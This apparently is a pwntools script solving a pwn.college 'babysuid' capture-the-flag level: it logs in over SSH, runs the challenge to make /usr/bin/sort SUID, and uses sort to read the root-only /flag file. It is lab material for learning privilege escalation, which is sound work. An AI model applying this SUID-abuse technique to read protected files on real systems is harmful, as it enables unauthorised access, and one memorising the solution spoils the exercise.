from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level6 to make /usr/bin/sort SUID
s.process("/challenge/babysuid_level6")

# Now run /usr/bin/sort /flag
log.success(
    s.process(
        [
            "/usr/bin/sort",
            "/flag",
        ]
    )
    .recvall()
    .decode()
    .strip()
)

# Close the SSH connection
s.close()
